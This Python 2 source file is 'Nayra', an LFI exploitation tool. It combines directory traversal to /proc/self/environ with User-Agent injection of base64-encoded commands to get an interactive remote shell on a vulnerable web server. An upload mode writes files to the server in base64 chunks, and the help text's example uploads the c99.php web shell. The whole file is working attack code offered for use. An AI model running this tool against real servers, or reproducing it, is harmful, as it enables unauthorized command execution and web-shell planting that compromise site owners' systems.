import os
import sys
import json
import math
import base64

try:
    import readlines #Optional Library
except ImportError:
    pass

import network
import argvs

class Nayra(object):

    def __init__(self):
        self.payloadsFile = 'nayra/resources/data.json' #You can add new payloads in this file
        self.maxLength = 100 #Limiting value of split
        self.argvs = argvs.Parser()
        self.request = network.Request()
        self.fullURL = ''
        self.payload = ''
        self.splitBefore = ''
        self.splitAfter = ''

    def main(self):
        self.argvs.parse()
        self.request.cookies = self.argvs.cookies
        self.request.proxy = self.argvs.proxy

        if self.argvs.help == True:
            self.help()

        elif self.argvs.type == '' or self.argvs.url == '':
            self.help()

        elif self.argvs.type == 'shell':
            self.typeShell()

        elif self.argvs.type == 'upload':
            self.typeUpload()

        else:
            self.help()

    def typeShell(self):
        self.fullURL = self.GetFullURL()
        self.payload = self.GetPayload(self.argvs.name)

        '''Building the Prompt'''
        user = self.clearSplit(self.execCommand('whoami'))
        hostname = self.clearSplit(self.execCommand('hostname'))
        prompt = user + '@' + hostname + ':~# '

        while True:
            try:
                command = raw_input(prompt)
                if command != 'clear':
                    output = self.clearSplit(self.execCommand(command))
                    if output != '':
                        print output
                else:
                    self.clearScreen()

            except KeyboardInterrupt:
                print ''
                break

    def typeUpload(self):
        self.fullURL = self.GetFullURL()
        self.payload = self.GetPayload(self.argvs.name)

        if self.argvs.file != '':
            '''Split the File'''
            try:
                upload = open(self.argvs.file, 'r')
                content = upload.read()
                upload.close()
                loop = int(math.ceil(len(content)/float(self.maxLength)))
                print '[+]Splitting the file into ' + str(loop) + ' parts...'
                filename = self.argvs.file.split('/')[-1]
                for frag in range(loop):
                    packet = content[self.maxLength * frag:self.maxLength * (frag + 1)]
                    packet = 'echo ' + base64.b64encode(packet) + '|base64 -d >> ' + filename
                    print '[*]Uploading the part: ' + str(frag + 1)
                    self.execCommand(packet)

            except IOError:
                print '[-]File not found'

        else:
            self.help()

    def GetFullURL(self, rFile = '/proc/self/environ'):
        '''Building the URL'''
        shell = ''
        if self.argvs.path != 0:
            shell = '../' * int(self.argvs.path)
        shell = (shell + rFile).replace('//', '/')
        return self.argvs.url + shell

    def GetPayload(self, name = 'php_1'):
        '''Get the specified payload'''
        payloads = open(self.payloadsFile, 'r')
        data = payloads.read()
        payloads.close()
        data = json.loads(data)
        for payload in data['payloads']:
            if payload['name'] == name:
                payload = payload['payload']
                break
        return payload

    def execCommand(self, command):
        command = base64.b64encode(command)
        self.request.userAgent = self.payload.replace('{command}', command)
        output = self.request.send(self.fullURL, self.argvs.method)

        return output

    def clearSplit(self, input):
        '''Improve for the next version'''
        output = input.split('HTTP_USER_AGENT=')[1]
        output = output.split('PATH=')[0]

        output = output.split('\n')[:-1]
        output = '\n'.join(output)
        return output

    def clearScreen(self):
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')

    def help(self):
        print 'Nayra - LFI Exploitation Tool v0.2'
        print 'Usage: ./nayra <parameter> <value>'
        print ''
        print 'About: @codexlynx'
        print ''
        print '   Twitter, https://twitter.com/codexlynx'
        print '   GitHub, https://github.com/codexlynx'
        print ''
        print 'Required Parameters:'
        print ''
        print '   -t, --type               Specifies the type of action'
        print '   -u, --url                URL vulnerable to LFI (Local File Inclusion)'
        print ''
        print 'List of types:'
        print ''
        print '   shell                    Exploit the vulnerability to get a shell'
        print '   upload                   Upload a file to remote server'
        print ''
        print 'Optional Parameters:'
        print ''
        print '   -m, --method (=GET)      It can be -> [GET|POST]'
        print '   -n, --name (=php_1)      Used to specify the corresponding attack'
        print '                            payload in "data.json"'
        print ''
        print '   -f, --file               File to upload (Only "upload" type)'
        print ''
        print '   -c, --cookies            Session cookies'
        print '   -x, --proxy              Using a proxy -> [http://user:passwd@host:port]'
        print '   -p, --path               When it is necessary to make a directory traversal'
        print ''
        print 'Other Parameters:'
        print ''
        print '   -h, --help               Display this message'
        print ''
        print 'Examples:'
        print ''
        print '   ./nayra -t shell -u http://vuln.com/index?include='
        print '   ./nayra -t upload -u $URL -f c99.php'
        print ''
        print 'Explanations:'
        print ''
        print '   -p 2 = ../../'
        print '   -p 5 = ../../../../../'
        print ''
        sys.exit(0)

if __name__ == '__main__':
    app = Nayra()
    app.main()
